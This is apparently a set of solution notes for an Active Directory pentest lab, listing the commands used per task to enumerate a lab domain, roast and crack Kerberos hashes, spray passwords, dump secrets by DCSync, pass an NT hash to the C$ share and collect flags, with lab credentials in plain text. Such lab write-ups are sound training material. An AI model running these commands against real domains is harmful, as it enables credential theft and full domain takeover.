#  Active Directory - Fundamentals
    
  ## task 0

1. evil-winrm -i 192.168.56.20 -u labuser -p 'P@ssw0rd123!’
2.  Get-Module -ListAvailable ActiveDirectory
3. Import-Module ActiveDirectory
4. Get-ADDomain
5. $dn = (Get-ADDomain).DistinguishedName
    
    Get-ADObject -Identity $dn -Properties * | Format-List *
    

## task 1

Get-ADUser -Filter 'SamAccountName -like "svc*"' -Properties *

## task 2

Get-ADGroup "Domain Admins" -Properties * | Format-List *

## task 3

cd HKLM:\SOFTWARE
ls

## task 4

Get-ADUser -Filter * -Properties HomeDirectory,Description,Info,Mobile,MobilePhone |
Format-List SamAccountName,HomeDirectory,Description,Info,Mobile,MobilePhone

#  Active Directory - Enumeration & Credential Abuse
## task 0

1. ldapsearch -x -H ldap://192.168.56.20 -b "DC=PENTESTLAB,DC=local" "(description=*)" sAMAccountName description
2. sudo apt install python3-impacket
3. impacket-GetNPUsers PENTESTLAB.local/legacy -dc-ip 192.168.56.20 -no-pass
4. hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
5. ldapsearch -x \
-H ldap://192.168.56.20 \
-D "legacy@PENTESTLAB.local" \
-w 'Password123' \
-b "DC=PENTESTLAB,DC=local" \
"(sAMAccountName=legacy)" \
comment

explanation

## task1

1. impacket-GetUserSPNs PENTESTLAB.local/legacy:Password123 -dc-ip 192.168.56.20
2. impacket-GetUserSPNs PENTESTLAB.local/legacy:Password123 \
-dc-ip 192.168.56.20 \
-request
3. hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
4. smbclient -L //192.168.56.20 \
-U svc_sql%Password1
5. smbclient //192.168.56.20/KerberosFlag \
-U svc_sql%Password1
6. get flag.txt

explanation

## task2

1. netexec smb 192.168.56.20 -u '' -p '' --users
2. smbclient -L //192.168.56.20 -U 'svc_app%AppServ1ce!'
3. smbclient //192.168.56.20/IT -U 'svc_app%AppServ1ce!'
4. get flag_t2.txt

explanation

## task3

ldapsearch -x -H ldap://192.168.56.20 \
-D "svc_app@PENTESTLAB.local" \
-w 'AppServ1ce!' \
-b "DC=PENTESTLAB,DC=local" \
"(objectClass=domain)" adminDescription

explanation

## task4

1. impacket-secretsdump PENTESTLAB.local/svc_backup:Password1@192.168.56.20
2. smbclient //192.168.56.20/C$ -U "Administrator" --pw-nt-hash b817733bdc947930b700cc2e567fb3ad
3. \FlagShares\DCSync_Proof\
4. get flag.txt

explanation

#  Active Directory - LDAP


## task0

ldapsearch -x -H ldap://192.168.56.20 \
-b "OU=LDAP-Project,DC=PENTESTLAB,DC=local" \
"(objectClass=user)"

explanation

## task1

ldapsearch -x -H ldap://192.168.56.20 \
-b "DC=PENTESTLAB,DC=local" \
"(objectClass=user)" "*"

explanation

## task2

$users = Get-ADUser -Filter * -Properties *

$users | ForEach-Object {
$props = $*.PSObject.Properties
foreach ($prop in $props) {
if ($prop.Name -notin @("DistinguishedName", "Enabled", "GivenName", "Surname", "SamAccountName", "Name", "ObjectClass", "ObjectGUID", "SID", "UserPrincipalName")) {
if ($prop.Value -match "flag|FLAG|\{.*\}|BH|bloodhound") {
Write-Host "`nFound in $($*.SamAccountName): $($prop.Name) = $($prop.Value)" -ForegroundColor Green
}
}
}
}

## task3

rpcclient -U 'svc_app%AppServ1ce!' 192.168.56.20

queryuser <rid>

rpcclient -U 'svc_app%AppServ1ce!' 192.168.56.20 -c "enumdomusers" \
| grep rid | awk -F'rid:\\[' '{print $2}' | awk -F']' '{print $1}' \
| while read rid; do
echo "RID: $rid"
rpcclient -U 'svc_app%AppServ1ce!' 192.168.56.20 -c "queryuser $rid"
done

explanation

## task4

ldapsearch -x -H ldap://192.168.56.20 -b "DC=PENTESTLAB,DC=local" \
"(userAccountControl:1.2.840.113556.1.4.803:=4194304)"

explanation

#  Active Directory - BloodHound Attack Path Analysis


## task0

ldapsearch -x -H ldap://192.168.56.20 \
-D "bh_intern@pentestlab.local" -w 'User@2025!' \
-b "DC=pentestlab,DC=local" \
"(sAMAccountName=bh_intern)" \
"*"

explanation

## task1

1. netexec smb 192.168.56.20 -u '' -p '' --users
2. netexec smb 192.168.56.20 -u users.txt -p 'Password123' --continue-on-success
3. ldapsearch -x -H ldap://192.168.56.20 \

-D "tempadmin@PENTESTLAB.local" \
-w 'Password123' \
-b "DC=PENTESTLAB,DC=local" "(telephoneNumber=*)"

## task2

1. impacket-GetUserSPNs PENTESTLAB.local/tempadmin:'Password123' -dc-ip 192.168.56.20 -request
2. john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=krb5tgs
3. ldapsearch -x -H ldap://192.168.56.20  -D "svc_backup@PENTESTLAB.local"  -w 'Password1'  -b "DC=PENTESTLAB,DC=local" "(homeDirectory=*)"

## task3

1.  impacket-GetNPUsers PENTES3TLAB.local/ -dc-ip 192.168.56.20 -usersfile users.txt -no-pass
2. john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=krb5asrep

ldapsearch -x -H ldap://192.168.56.20 -D "jmartin@PENTESTLAB.local" \
-w 'Baseball1' \
-b "DC=PENTESTLAB,DC=local" "(employeeType=*)"

## task4

ldapsearch -x -H ldap://192.168.56.20 \ -D "svc_backup@PENTESTLAB.local" \ -w 'Password1' \ -b "DC=PENTESTLAB,DC=local" \ "(userAccountControl:1.2.840.113556.1.4.803:=2)”

## task5

ldapsearch -x -H ldap://192.168.56.20 \ -D "svc_backup@PENTESTLAB.local" \ -w 'Password1' \ -b "DC=PENTESTLAB,DC=local" \ "(sAMAccountName=bh_helpdesk)" "*”

ldapsearch -x -H ldap://192.168.56.20 \ -D "svc_backup@PENTESTLAB.local" \ -w 'Password1' \ -b "DC=PENTESTLAB,DC=local" \ "(sAMAccountName=bh_sysadmin)" "*”

explanation

## task6

smbclient //192.168.56.20/SYSVOL -U 'PENTESTLAB.local\bh_intern'

cd PENTESTLAB.local

cd scripts

